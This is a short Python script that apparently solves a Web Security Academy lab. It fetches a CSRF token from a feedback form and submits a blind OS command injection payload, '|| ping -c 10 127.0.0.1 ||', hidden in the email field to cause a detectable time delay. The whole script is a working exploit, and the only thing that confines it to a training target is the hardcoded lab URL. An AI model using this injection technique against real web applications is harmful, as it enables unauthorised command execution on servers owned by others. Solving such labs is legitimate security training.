import requests
from bs4 import BeautifulSoup

if __name__ == "__main__":
    s = requests.Session()
    site = 'https://ac041f7f1e320d25c01623b200b90039.web-security-academy.net'
    feedback_url = f'{site}/feedback'
    resp = s.get(feedback_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    feedback_submit_url = f'{site}/feedback/submit'
    post_data = {
        'csrf': csrf,
        'name': 'x',
        'email': 'x@x.com || ping -c 10 127.0.0.1 ||',
        'subject': 'x',
        'message': 'x'
    }
    resp = s.post(feedback_submit_url, data=post_data)
    print(resp.text)
